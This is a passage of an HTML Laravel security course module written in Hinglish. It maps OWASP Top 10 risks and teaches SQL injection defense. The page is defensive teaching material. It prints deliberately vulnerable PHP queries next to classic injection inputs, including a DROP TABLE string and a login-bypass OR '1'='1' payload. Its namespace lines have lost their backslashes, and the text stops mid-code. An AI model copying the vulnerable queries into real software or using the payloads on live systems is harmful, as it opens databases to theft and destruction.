@@ -1,0 +1,1725 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>Module 13 — Laravel Security &amp; OWASP Top 10 (Hinglish) | ShopSphere Pro</title>
+<meta name="description" content="Production Laravel Security masterclass in Hinglish — OWASP Top 10 defenses, SQL injection, XSS, CSRF, mass assignment, IDOR, file upload hardening, and security headers."/>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet"/>
+<style>
+:root {
+  --bg-primary: #0a0e1a;
+  --bg-secondary: #0f1422;
+  --bg-card: #141929;
+  --bg-code: #0d1117;
+  --border: #1e2d4a;
+  --text-primary: #e2e8f0;
+  --text-secondary: #94a3b8;
+  --text-muted: #64748b;
+  --accent-blue: #3b82f6;
+  --accent-purple: #8b5cf6;
+  --accent-green: #10b981;
+  --accent-amber: #f59e0b;
+  --accent-red: #ef4444;
+  --accent-cyan: #06b6d4;
+  --gradient-card: linear-gradient(145deg, #141929, #0f1422);
+  --radius: 12px;
+  --radius-sm: 8px;
+}
+* { margin: 0; padding: 0; box-sizing: border-box; }
+html { scroll-behavior: smooth; }
+body {
+  font-family: 'Inter', sans-serif;
+  background: var(--bg-primary);
+  color: var(--text-primary);
+  line-height: 1.7;
+  overflow-x: hidden;
+}
+.hero {
+  background: linear-gradient(135deg, #0a0e1a 0%, #1a0a0a 50%, #0e0a1a 100%);
+  border-bottom: 1px solid var(--border);
+  padding: 60px 40px 50px;
+  position: relative;
+  overflow: hidden;
+}
+.hero::before {
+  content: '';
+  position: absolute;
+  top: -100px;
+  right: -100px;
+  width: 500px;
+  height: 500px;
+  background: radial-gradient(circle, rgba(239, 68, 68, 0.12) 0%, transparent 70%);
+  pointer-events: none;
+}
+.hero::after {
+  content: '';
+  position: absolute;
+  bottom: -80px;
+  left: -80px;
+  width: 400px;
+  height: 400px;
+  background: radial-gradient(circle, rgba(139, 92, 246, 0.1) 0%, transparent 70%);
+  pointer-events: none;
+}
+.hero-inner { max-width: 1200px; margin: 0 auto; position: relative; z-index: 1; }
+.hero-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  background: rgba(239, 68, 68, 0.15);
+  border: 1px solid rgba(239, 68, 68, 0.4);
+  border-radius: 20px;
+  padding: 6px 16px;
+  font-size: 0.75rem;
+  font-weight: 600;
+  color: #fca5a5;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  margin-bottom: 20px;
+}
+.hero h1 {
+  font-size: clamp(2rem, 5vw, 3.2rem);
+  font-weight: 800;
+  line-height: 1.15;
+  background: linear-gradient(135deg, #e2e8f0 0%, #ef4444 40%, #8b5cf6 100%);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  margin-bottom: 16px;
+}
+.hero p {
+  font-size: 1.1rem;
+  color: var(--text-secondary);
+  max-width: 780px;
+  margin-bottom: 30px;
+}
+.hero-tags { display: flex; flex-wrap: wrap; gap: 10px; }
+.hero-tag {
+  background: rgba(255, 255, 255, 0.05);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 4px 12px;
+  font-size: 0.8rem;
+  color: var(--text-secondary);
+}
+.hero-stats {
+  display: flex;
+  gap: 30px;
+  margin-top: 32px;
+  padding-top: 28px;
+  border-top: 1px solid var(--border);
+}
+.hero-stat-val { font-size: 1.6rem; font-weight: 800; color: var(--accent-red); }
+.hero-stat-label { font-size: 0.75rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; }
+.progress-bar { background: var(--bg-secondary); border-bottom: 1px solid var(--border); padding: 14px 40px; }
+.progress-bar-inner { max-width: 1200px; margin: 0 auto; display: flex; align-items: center; gap: 16px; }
+.progress-track { flex: 1; height: 6px; background: var(--border); border-radius: 99px; overflow: hidden; }
+.progress-fill {
+  height: 100%;
+  border-radius: 99px;
+  background: linear-gradient(90deg, var(--accent-red), var(--accent-purple));
+  transition: width 0.6s ease;
+}
+.layout { max-width: 1200px; margin: 0 auto; padding: 40px; }
+.section-nav {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 6px;
+  background: var(--bg-secondary);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 8px;
+  margin-bottom: 32px;
+}
+.snav-btn {
+  flex: 1;
+  min-width: 105px;
+  padding: 10px 12px;
+  background: transparent;
+  border: none;
+  border-radius: var(--radius-sm);
+  color: var(--text-muted);
+  font-size: 0.77rem;
+  font-weight: 500;
+  cursor: pointer;
+  transition: all 0.25s;
+  text-align: center;
+  font-family: 'Inter', sans-serif;
+}
+.snav-btn:hover { background: rgba(255, 255, 255, 0.05); color: var(--text-primary); }
+.snav-btn.active {
+  background: rgba(239, 68, 68, 0.16);
+  border: 1px solid rgba(239, 68, 68, 0.4);
+  color: #fca5a5;
+  font-weight: 600;
+}
+.snav-btn .dot {
+  display: inline-block;
+  width: 7px;
+  height: 7px;
+  border-radius: 50%;
+  margin-right: 6px;
+}
+.section-panel { display: none; }
+.section-panel.active { display: block; animation: fadeUp 0.35s ease; }
+@keyframes fadeUp {
+  from { opacity: 0; transform: translateY(14px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+.card {
+  background: var(--gradient-card);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 28px;
+  margin-bottom: 24px;
+  box-shadow: 0 4px 24px rgba(0, 0, 0, 0.4);
+  transition: border-color 0.25s;
+}
+.card:hover { border-color: rgba(239, 68, 68, 0.25); }
+.card-title {
+  font-size: 1.15rem;
+  font-weight: 700;
+  color: var(--text-primary);
+  margin-bottom: 14px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+.card-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(270px, 1fr));
+  gap: 20px;
+  margin-bottom: 24px;
+}
+.card-sm { padding: 20px; }
+.code-block {
+  background: var(--bg-code);
+  border: 1px solid #1e2d4a;
+  border-radius: var(--radius-sm);
+  overflow: hidden;
+  margin: 18px 0;
+}
+.code-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 10px 16px;
+  background: rgba(255, 255, 255, 0.03);
+  border-bottom: 1px solid #1e2d4a;
+}
+.code-lang {
+  font-size: 0.72rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 1.5px;
+  color: var(--text-muted);
+}
+.code-filename {
+  font-size: 0.78rem;
+  color: #fca5a5;
+  font-family: 'JetBrains Mono', monospace;
+}
+.copy-btn {
+  background: rgba(239, 68, 68, 0.1);
+  border: 1px solid rgba(239, 68, 68, 0.3);
+  border-radius: 5px;
+  padding: 4px 10px;
+  color: #fca5a5;
+  font-size: 0.72rem;
+  cursor: pointer;
+  transition: all 0.2s;
+  font-family: 'Inter', sans-serif;
+}
+.copy-btn:hover { background: rgba(239, 68, 68, 0.2); }
+.copy-btn.copied { color: var(--accent-green); border-color: rgba(16, 185, 129, 0.4); }
+pre {
+  padding: 20px;
+  overflow-x: auto;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.84rem;
+  line-height: 1.7;
+  color: #c9d1d9;
+}
+.kw { color: #ff7b72; font-weight: 600; }
+.fn { color: #d2a8ff; }
+.str { color: #a5d6ff; }
+.cm { color: #8b949e; font-style: italic; }
+.num { color: #79c0ff; }
+.cl { color: #ffa657; }
+.ph { color: #56d364; }
+.anno { color: #58a6ff; }
+.bad { color: #ff6b6b; font-weight: 600; }
+.good-code { color: #4ade80; font-weight: 600; }
+.two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+.alert {
+  display: flex;
+  gap: 14px;
+  align-items: flex-start;
+  padding: 16px 20px;
+  border-radius: var(--radius-sm);
+  margin: 18px 0;
+  border-left: 4px solid;
+}
+.alert-icon { font-size: 1.15rem; flex-shrink: 0; margin-top: 2px; }
+.alert-body { font-size: 0.88rem; line-height: 1.65; }
+.alert-body strong { font-weight: 600; display: block; margin-bottom: 4px; }
+.alert-info { background: rgba(59, 130, 246, 0.08); border-color: var(--accent-blue); color: #93c5fd; }
+.alert-success { background: rgba(16, 185, 129, 0.08); border-color: var(--accent-green); color: #6ee7b7; }
+.alert-warn { background: rgba(245, 158, 11, 0.08); border-color: var(--accent-amber); color: #fcd34d; }
+.alert-danger { background: rgba(239, 68, 68, 0.08); border-color: var(--accent-red); color: #fca5a5; }
+.compare-table { width: 100%; border-collapse: collapse; margin: 16px 0; font-size: 0.88rem; }
+.compare-table th {
+  background: rgba(239, 68, 68, 0.1);
+  color: #fca5a5;
+  padding: 12px 16px;
+  text-align: left;
+  font-weight: 700;
+  border-bottom: 2px solid rgba(239, 68, 68, 0.3);
+}
+.compare-table td { padding: 12px 16px; border-bottom: 1px solid var(--border); color: var(--text-secondary); }
+.compare-table tr:hover td { background: rgba(255, 255, 255, 0.02); color: var(--text-primary); }
+.compare-table .good { color: var(--accent-green); font-weight: 600; }
+.compare-table .bad-cell { color: var(--accent-red); font-weight: 600; }
+.owasp-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 14px; margin-bottom: 24px; }
+.owasp-card { border-radius: var(--radius-sm); padding: 16px; border: 1px solid; cursor: pointer; transition: all 0.25s; }
+.owasp-card:hover { transform: translateY(-2px); }
+.owasp-num { font-size: 0.72rem; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px; }
+.owasp-title { font-size: 0.9rem; font-weight: 700; margin-bottom: 4px; }
+.owasp-sub { font-size: 0.78rem; opacity: 0.75; }
+.section-title {
+  font-size: 1.55rem;
+  font-weight: 800;
+  color: var(--text-primary);
+  margin-bottom: 8px;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+.section-subtitle { color: var(--text-secondary); font-size: 0.95rem; margin-bottom: 28px; }
+.practice-box {
+  background: linear-gradient(135deg, rgba(239, 68, 68, 0.06), rgba(139, 92, 246, 0.06));
+  border: 1px solid rgba(239, 68, 68, 0.25);
+  border-radius: var(--radius);
+  padding: 24px;
+  margin: 24px 0;
+}
+.practice-title {
+  font-size: 0.88rem;
+  font-weight: 700;
+  color: #fca5a5;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  margin-bottom: 12px;
+}
+.practice-tasks { list-style: none; }
+.practice-tasks li {
+  padding: 8px 0;
+  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+  font-size: 0.88rem;
+  color: var(--text-secondary);
+  display: flex;
+  align-items: flex-start;
+  gap: 10px;
+}
+.practice-tasks li::before { content: '→'; color: #fca5a5; flex-shrink: 0; font-weight: 700; }
+.practice-tasks li:last-child { border-bottom: none; }
+.vuln-tag {
+  display: inline-flex;
+  align-items: center;
+  gap: 5px;
+  padding: 3px 9px;
+  border-radius: 4px;
+  font-size: 0.72rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  margin: 3px;
+}
+.tag-critical { background: rgba(239, 68, 68, 0.2); color: #fca5a5; border: 1px solid rgba(239, 68, 68, 0.4); }
+.tag-high { background: rgba(245, 158, 11, 0.2); color: #fcd34d; border: 1px solid rgba(245, 158, 11, 0.4); }
+.tag-med { background: rgba(59, 130, 246, 0.2); color: #93c5fd; border: 1px solid rgba(59, 130, 246, 0.4); }
+.cheat-card { background: var(--bg-code); border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 18px; }
+.cheat-title {
+  font-size: 0.8rem;
+  font-weight: 700;
+  color: #fca5a5;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  margin-bottom: 12px;
+}
+.cheat-item { font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; color: #a5d6ff; margin-bottom: 8px; }
+.cheat-item span { color: var(--text-muted); font-size: 0.73rem; display: block; font-family: 'Inter', sans-serif; }
+.cheatsheet-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 16px; }
+.footer {
+  background: var(--bg-secondary);
+  border-top: 1px solid var(--border);
+  padding: 32px 40px;
+  text-align: center;
+  color: var(--text-muted);
+  font-size: 0.85rem;
+  margin-top: 40px;
+}
+.footer span { color: #fca5a5; font-weight: 600; }
+::-webkit-scrollbar { width: 7px; height: 7px; }
+::-webkit-scrollbar-track { background: var(--bg-primary); }
+::-webkit-scrollbar-thumb { background: #2d3748; border-radius: 4px; }
+@media (max-width: 768px) {
+  .hero { padding: 40px 20px; }
+  .layout { padding: 24px 20px; }
+  .two-col { grid-template-columns: 1fr; }
+  .hero-stats { gap: 16px; flex-wrap: wrap; }
+}
+</style>
+</head>
+<body>
+
+<section class="hero">
+  <div class="hero-inner">
+    <div class="hero-badge">&#x1F6E1;&#xFE0F; Critical Gap #3 &bull; Hinglish Masterclass</div>
+    <h1>Laravel Security &amp; OWASP Top 10 (Hinglish Guide)</h1>
+    <p>Har saal hazaron production applications hack hoti hain un choti mistakes ki wajah se jo easily avoid ki ja sakti thin. Is deep masterclass mein jaaniye kaise SQL Injection, XSS, CSRF, Mass Assignment, IDOR, aur Insecure File Uploads se apne Laravel app ko airtight protect karte hain.</p>
+    <div class="hero-tags">
+      <span class="hero-tag">&#x1F6E1;&#xFE0F; OWASP Top 10 Defenses</span>
+      <span class="hero-tag">&#x1F489; SQL Injection Shield</span>
+      <span class="hero-tag">&#x1F4BB; XSS &amp; CSP Policy</span>
+      <span class="hero-tag">&#x1F510; CSRF Protection</span>
+      <span class="hero-tag">&#x1F4CB; Mass Assignment Hardening</span>
+      <span class="hero-tag">&#x1F511; IDOR &amp; Policy Gates</span>
+      <span class="hero-tag">&#x1F4C2; Insecure Upload Defense</span>
+      <span class="hero-tag">&#x1F512; Security Headers &amp; .env</span>
+    </div>
+    <div class="hero-stats">
+      <div><div class="hero-stat-val">10</div><div class="hero-stat-label">OWASP Threat Areas</div></div>
+      <div><div class="hero-stat-val">40+</div><div class="hero-stat-label">Security Patterns</div></div>
+      <div><div class="hero-stat-val">100%</div><div class="hero-stat-label">Hinglish Code Walkthrough</div></div>
+      <div><div class="hero-stat-val">Zero-Day</div><div class="hero-stat-label">Audit Checklist</div></div>
+    </div>
+  </div>
+</section>
+
+<div class="progress-bar">
+  <div class="progress-bar-inner">
+    <span style="font-size:0.8rem;color:var(--text-muted);white-space:nowrap">Progress:</span>
+    <div class="progress-track"><div id="prog-fill" class="progress-fill" style="width:11.1%"></div></div>
+    <span id="prog-pct" style="font-size:0.8rem;font-weight:700;color:var(--accent-red);min-width:38px">11.1%</span>
+  </div>
+</div>
+
+<div class="layout">
+
+<nav class="section-nav">
+  <button class="snav-btn active" onclick="showSection('sec-overview',this)"><span class="dot" style="background:#ef4444"></span>OWASP Map</button>
+  <button class="snav-btn" onclick="showSection('sec-injection',this)"><span class="dot" style="background:#f97316"></span>SQL Injection</button>
+  <button class="snav-btn" onclick="showSection('sec-xss',this)"><span class="dot" style="background:#f59e0b"></span>XSS</button>
+  <button class="snav-btn" onclick="showSection('sec-csrf',this)"><span class="dot" style="background:#10b981"></span>CSRF</button>
+  <button class="snav-btn" onclick="showSection('sec-mass',this)"><span class="dot" style="background:#3b82f6"></span>Mass Assignment</button>
+  <button class="snav-btn" onclick="showSection('sec-auth',this)"><span class="dot" style="background:#8b5cf6"></span>Broken Auth</button>
+  <button class="snav-btn" onclick="showSection('sec-upload',this)"><span class="dot" style="background:#ec4899"></span>File Upload</button>
+  <button class="snav-btn" onclick="showSection('sec-headers',this)"><span class="dot" style="background:#06b6d4"></span>Headers &amp; .env</button>
+  <button class="snav-btn" onclick="showSection('sec-checklist',this)"><span class="dot" style="background:#a78bfa"></span>Checklist</button>
+</nav>
+
+
+<!-- SECTION 1: OVERVIEW & OWASP MAP -->
+<div id="sec-overview" class="section-panel active">
+  <div class="section-title">&#x1F5FA;&#xFE0F; OWASP Top 10 &mdash; Laravel Threat Map</div>
+  <p class="section-subtitle">OWASP Top 10 global web application security ka gold standard hai. Kisi bhi card par click karke dekhiye ki wo vulnerability Laravel mein kaise attack create karti hai aur uska enterprise defense kya hai.</p>
+
+  <div class="owasp-grid">
+    <div class="owasp-card" style="background:rgba(239,68,68,.08);border-color:rgba(239,68,68,.35);" onclick="showSection('sec-injection',document.querySelectorAll('.snav-btn')[1])">
+      <div class="owasp-num" style="color:#fca5a5;">A03 &bull; Critical</div>
+      <div class="owasp-title" style="color:#fca5a5;">SQL Injection</div>
+      <div class="owasp-sub" style="color:#fca5a5;">Raw queries aur unescaped input se database takeover</div>
+    </div>
+
+    <div class="owasp-card" style="background:rgba(239,68,68,.08);border-color:rgba(239,68,68,.35);" onclick="showSection('sec-xss',document.querySelectorAll('.snav-btn')[2])">
+      <div class="owasp-num" style="color:#fca5a5;">A03 &bull; Critical</div>
+      <div class="owasp-title" style="color:#fca5a5;">Cross-Site Scripting (XSS)</div>
+      <div class="owasp-sub" style="color:#fca5a5;">Unescaped Blade output se cookies aur auth tokens ki chori</div>
+    </div>
+
+    <div class="owasp-card" style="background:rgba(245,158,11,.08);border-color:rgba(245,158,11,.35);" onclick="showSection('sec-csrf',document.querySelectorAll('.snav-btn')[3])">
+      <div class="owasp-num" style="color:#fcd34d;">A01 &bull; High</div>
+      <div class="owasp-title" style="color:#fcd34d;">CSRF Attacks</div>
+      <div class="owasp-sub" style="color:#fcd34d;">Malicious 3rd-party website se unauthorized forged actions</div>
+    </div>
+
+    <div class="owasp-card" style="background:rgba(245,158,11,.08);border-color:rgba(245,158,11,.35);" onclick="showSection('sec-mass',document.querySelectorAll('.snav-btn')[4])">
+      <div class="owasp-num" style="color:#fcd34d;">A08 &bull; High</div>
+      <div class="owasp-title" style="color:#fcd34d;">Mass Assignment</div>
+      <div class="owasp-sub" style="color:#fcd34d;">Unguarded models mein is_admin aur role fields overwrite hona</div>
+    </div>
+
+    <div class="owasp-card" style="background:rgba(239,68,68,.08);border-color:rgba(239,68,68,.35);" onclick="showSection('sec-auth',document.querySelectorAll('.snav-btn')[5])">
+      <div class="owasp-num" style="color:#fca5a5;">A07 &bull; Critical</div>
+      <div class="owasp-title" style="color:#fca5a5;">Broken Auth &amp; IDOR</div>
+      <div class="owasp-sub" style="color:#fca5a5;">Weak passwords, IDOR (Insecure Direct Object Reference) aur session hijacking</div>
+    </div>
+
+    <div class="owasp-card" style="background:rgba(245,158,11,.08);border-color:rgba(245,158,11,.35);" onclick="showSection('sec-upload',document.querySelectorAll('.snav-btn')[6])">
+      <div class="owasp-num" style="color:#fcd34d;">A04 &bull; High</div>
+      <div class="owasp-title" style="color:#fcd34d;">Insecure File Upload</div>
+      <div class="owasp-sub" style="color:#fcd34d;">Malicious PHP web shells image disguise karke upload karna</div>
+    </div>
+
+    <div class="owasp-card" style="background:rgba(59,130,246,.08);border-color:rgba(59,130,246,.35);" onclick="showSection('sec-headers',document.querySelectorAll('.snav-btn')[7])">
+      <div class="owasp-num" style="color:#93c5fd;">A02 &bull; Medium</div>
+      <div class="owasp-title" style="color:#93c5fd;">Sensitive Data &amp; .env</div>
+      <div class="owasp-sub" style="color:#93c5fd;">Debug mode true rehna, .env publicly expose hona aur missing headers</div>
+    </div>
+
+    <div class="owasp-card" style="background:rgba(139,92,246,.08);border-color:rgba(139,92,246,.35);" onclick="showSection('sec-auth',document.querySelectorAll('.snav-btn')[5])">
+      <div class="owasp-num" style="color:#a78bfa;">A01 &bull; High</div>
+      <div class="owasp-title" style="color:#a78bfa;">Broken Access Control</div>
+      <div class="owasp-sub" style="color:#a78bfa;">Missing Policies/Gates ki wajah se unauthorized order/data access</div>
+    </div>
+
+    <div class="owasp-card" style="background:rgba(16,185,129,.08);border-color:rgba(16,185,129,.35);" onclick="showSection('sec-checklist',document.querySelectorAll('.snav-btn')[8])">
+      <div class="owasp-num" style="color:#6ee7b7;">A05 &bull; Medium</div>
+      <div class="owasp-title" style="color:#6ee7b7;">Security Misconfiguration</div>
+      <div class="owasp-sub" style="color:#6ee7b7;">Default credentials, verbose stack trace errors, permissive permissions</div>
+    </div>
+
+    <div class="owasp-card" style="background:rgba(6,182,212,.08);border-color:rgba(6,182,212,.35);" onclick="showSection('sec-checklist',document.querySelectorAll('.snav-btn')[8])">
+      <div class="owasp-num" style="color:#67e8f9;">A06 &bull; Medium</div>
+      <div class="owasp-title" style="color:#67e8f9;">Vulnerable Packages</div>
+      <div class="owasp-sub" style="color:#67e8f9;">Outdated Composer/NPM dependencies jinme known CVE exploits hain</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">&#x1F6E1;&#xFE0F; The Laravel Security Matrix: Default vs Developer Responsibility</div>
+    <p style="color:var(--text-secondary);margin-bottom:18px">Laravel framework out-of-the-box bahut powerful security guardrails deta hai, lekin galat coding patterns se ye shields bypass ho sakti hain:</p>
+
+    <table class="compare-table">
+      <thead>
+        <tr>
+          <th>Threat Category</th>
+          <th>Laravel Ki Default Protection</th>
+          <th>Developer Ki Responsibility (Aapko Kya Karna Hai)</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><strong>SQL Injection</strong></td>
+          <td class="good">&#x2705; Eloquent PDO prepared statements use karta hai</td>
+          <td class="bad-cell">Kabhie bhi user input ko <code>DB::raw()</code> ya string interpolation mein na dalein</td>
+        </tr>
+        <tr>
+          <td><strong>Cross-Site Scripting (XSS)</strong></td>
+          <td class="good">&#x2705; Blade <code>{{ }}</code> syntax HTML ko auto-escape karta hai</td>
+          <td class="bad-cell">Unescaped <code>{!! !!}</code> ko user input par kabhi na chalayein; HTMLPurifier use karein</td>
+        </tr>
+        <tr>
+          <td><strong>CSRF Attacks</strong></td>
+          <td class="good">&#x2705; Web middleware group session CSRF tokens verify karta hai</td>
+          <td class="bad-cell">Har Blade form mein <code>@csrf</code> aur AJAX requests mein <code>X-CSRF-TOKEN</code> ensure karein</td>
+        </tr>
+        <tr>
+          <td><strong>Mass Assignment</strong></td>
+          <td class="good">&#x2705; Eloquent <code>$fillable</code> whitelist enforce karta hai</td>
+          <td class="bad-cell">Kabhie bhi <code>$guarded = []</code> use na karein; hamesha Form Requests ka <code>validated()</code> use karein</td>
+        </tr>
+        <tr>
+          <td><strong>Password Hashing</strong></td>
+          <td class="good">&#x2705; Bcrypt/Argon2id hashing via <code>Hash::make()</code></td>
+          <td class="bad-cell">Kabhie bhi plain text password save na karein; strong validation rules enforce karein</td>
+        </tr>
+        <tr>
+          <td><strong>File Upload Attacks</strong></td>
+          <td class="bad-cell">&#x26A0;&#xFE0F; Partial &mdash; default config file headers check nahi karti</td>
+          <td class="bad-cell">Strict MIME validation, randomized filenames, aur private disk storage implement karein</td>
+        </tr>
+        <tr>
+          <td><strong>Security Headers</strong></td>
+          <td class="bad-cell">&#x26A0;&#xFE0F; By default koi CSP ya HSTS headers nahi aate</td>
+          <td class="bad-cell">Custom <code>SecurityHeaders</code> middleware create karke globally register karein</td>
+        </tr>
+        <tr>
+          <td><strong>Brute Force &amp; DoS</strong></td>
+          <td class="good">&#x2705; Dynamic <code>RateLimiter</code> facade built-in available hai</td>
+          <td class="bad-cell">Login endpoints aur public APIs par strict rate limiting apply karein</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+
+<!-- SECTION 2: SQL INJECTION -->
+<div id="sec-injection" class="section-panel">
+  <div class="section-title">&#x1F489; SQL Injection &mdash; A03 (The Database Destroyer)</div>
+  <p class="section-subtitle"><span class="vuln-tag tag-critical">CRITICAL</span> SQL injection tab hoti hai jab user ke unescaped input ko direct SQL string mein concatenate kiya jata hai, jisse attacker database ke table drop kar sakta hai ya authentication bypass kar leta hai.</p>
+
+  <div class="card">
+    <div class="card-title">&#x274C; Vulnerable Code &mdash; Yeh Galatiyan Kabhie Mat Karna!</div>
+    <p style="color:var(--text-secondary);margin-bottom:14px">Neeche diye gaye patterns dekhne mein harmless lagte hain, lekin ye direct remote database execution exploit offer karte hain:</p>
+
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">php</span><span class="code-filename">VulnerableController.php (Fatal Security Flaws)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><span class="ph">&lt;?php</span>
+
+<span class="cm">// &#x274C; CRITICAL FLAW 1: Direct SQL string interpolation</span>
+<span class="cm">// User input: "'; DROP TABLE users; --"</span>
+$name = <span class="fn">request</span>(<span class="str">'name'</span>);
+$users = <span class="cl">DB</span>::<span class="fn">select</span>(<span class="str">"SELECT * FROM users WHERE name = '$name'"</span>);
+
+<span class="cm">// &#x274C; CRITICAL FLAW 2: whereRaw() with string concatenation</span>
+<span class="cm">// Attacker input: "0 OR 1=1"</span>
+$products = <span class="cl">Product</span>::<span class="fn">whereRaw</span>(<span class="str">"price > "</span> . <span class="fn">request</span>(<span class="str">'min_price'</span>))-><span class="fn">get</span>();
+
+<span class="cm">// &#x274C; CRITICAL FLAW 3: User input directly in orderByRaw()</span>
+<span class="cm">// Attacker input: "(CASE WHEN (SELECT 1=1) THEN price ELSE id END)"</span>
+$column = <span class="fn">request</span>(<span class="str">'sort'</span>);
+$products = <span class="cl">Product</span>::<span class="fn">orderByRaw</span>($column)-><span class="fn">get</span>();
+
+<span class="cm">// &#x274C; HIGH FLAW 4: LIKE query bina PDO binding ke</span>
+$search = <span class="fn">request</span>(<span class="str">'q'</span>);
+$results = <span class="cl">DB</span>::<span class="fn">select</span>(<span class="str">"SELECT * FROM products WHERE name LIKE '%$search%'"</span>);</pre>
+    </div>
+
+    <div class="alert alert-danger">
+      <span class="alert-icon">&#x1F6A8;</span>
+      <div class="alert-body">
+        <strong>Real-World Attack Payload Example:</strong>
+        Agar login form ke email field mein attacker input de: <code>admin@shopsphere.com' OR '1'='1</code>, aur backend direct string query chala raha ho, toh password check evaluate hi nahi hoga aur attacker sidha admin account mein login ho jayega!
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">&#x2705; Safe Code &mdash; Laravel Ki PDO Prepared Statements Shield</div>
+    <p style="color:var(--text-secondary);margin-bottom:14px">Laravel ka Eloquent ORM by default PDO prepared statements use karta hai jisme SQL structure aur data values alag-alag transmit hoti hain:</p>
+
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">php</span><span class="code-filename">SecureProductController.php (Production Standard)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><span class="ph">&lt;?php</span>
+
+<span class="cm">// &#x2705; SECURE 1: Standard Eloquent Query Builder (Auto-parameterized)</span>
+<span class="cm">// Koi bhi malicious characters plain string data ki tarah treat honge</span>
+$name = <span class="fn">request</span>(<span class="str">'name'</span>);
+$users = <span class="cl">User</span>::<span class="fn">where</span>(<span class="str">'name'</span>, $name)-><span class="fn">get</span>();
+
+<span class="cm">// &#x2705; SECURE 2: whereRaw() with bindings array parameter</span>
+$minPrice = <span class="fn">request</span>(<span class="str">'min_price'</span>);
+$products = <span class="cl">Product</span>::<span class="fn">whereRaw</span>(<span class="str">'price > ?'</span>, [$minPrice])-><span class="fn">get</span>();
+
+<span class="cm">// &#x2705; SECURE 3: Whitelist allowed sort columns (Column names bind nahi ho sakte!)</span>
+$allowedSorts = [<span class="str">'price'</span>, <span class="str">'name'</span>, <span class="str">'created_at'</span>, <span class="str">'rating'</span>];
+$column = <span class="fn">in_array</span>(<span class="fn">request</span>(<span class="str">'sort'</span>), $allowedSorts, <span class="kw">true</span>)
+    ? <span class="fn">request</span>(<span class="str">'sort'</span>)
+    : <span class="str">'created_at'</span>;
+
+$direction = <span class="fn">strtolower</span>(<span class="fn">request</span>(<span class="str">'dir'</span>, <span class="str">'desc'</span>)) === <span class="str">'asc'</span> ? <span class="str">'asc'</span> : <span class="str">'desc'</span>;
+$products = <span class="cl">Product</span>::<span class="fn">orderBy</span>($column, $direction)-><span class="fn">paginate</span>(<span class="num">20</span>);
+
+<span class="cm">// &#x2705; SECURE 4: LIKE search with parameter binding</span>
+$search = <span class="fn">request</span>(<span class="str">'q'</span>);
+$results = <span class="cl">Product</span>::<span class="fn">where</span>(<span class="str">'name'</span>, <span class="str">'LIKE'</span>, <span class="str">'%'</span> . $search . <span class="str">'%'</span>)-><span class="fn">get</span>();
+
+<span class="cm">// &#x2705; SECURE 5: Raw DB::select with named bindings</span>
+$results = <span class="cl">DB</span>::<span class="fn">select</span>(
+    <span class="str">'SELECT * FROM users WHERE email = :email AND status = :status'</span>,
+    [
+        <span class="str">'email'</span>  => <span class="fn">request</span>(<span class="str">'email'</span>),
+        <span class="str">'status'</span> => <span class="str">'active'</span>,
+    ]
+);</pre>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">&#x1F4CB; Complex Analytics Queries Mein Safe Raw Queries Likhna</div>
+    <p style="color:var(--text-secondary);margin-bottom:14px">Agar reporting ya complex aggregation ke liye raw SQL likhna majboori ho, toh hamesha input validation, type-casting aur bindings combine karein:</p>
+
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">php</span><span class="code-filename">AnalyticsReportController.php (Secure Raw Aggregation)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><span class="ph">&lt;?php</span>
+
+<span class="kw">namespace</span> AppHttpControllers;
+
+<span class="kw">use</span> <span class="cl">IlluminateHttpRequest</span>;
+<span class="kw">use</span> <span class="cl">IlluminateSupportFacadesDB</span>;
+
+<span class="kw">class</span> <span class="cl">AnalyticsReportController</span> <span class="kw">extends</span> <span class="cl">Controller</span>
+{
+    <span class="kw">public function</span> <span class="fn">dailyRevenue</span>(<span class="cl">Request</span> $request)
+    {
+        <span class="cm">// 1. Pehle strictly validate karo inputs ko</span>
+        $validated = $request-><span class="fn">validate</span>([
+            <span class="str">'start_date'</span> => <span class="str">'required|date|before_or_equal:end_date'</span>,
